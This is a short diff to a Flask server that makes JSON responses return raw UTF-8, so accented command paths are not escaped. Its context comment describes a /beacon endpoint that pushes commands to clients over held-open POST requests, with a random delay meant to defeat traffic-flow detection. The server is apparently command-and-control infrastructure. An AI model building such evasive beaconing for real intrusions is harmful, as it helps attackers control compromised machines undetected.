@@ -10,6 +10,11 @@ app = Flask(__name__)
 manager = None
 command_manager = None
 
+# Reponses en UTF-8 brut. Sans ceci, Flask echappe le non-ASCII en \uXXXX :
+# les commandes accentuees (chemins de fichiers) reviennent sous forme
+# d'echappements que le client doit redecoder.
+app.json.ensure_ascii = False
+
 # Tenue de la requete /beacon : le client garde un POST ouvert et recoit la
 # commande des qu'elle est disponible. Le tirage aleatoire evite une
 # periodicite detectable par analyse de flux.
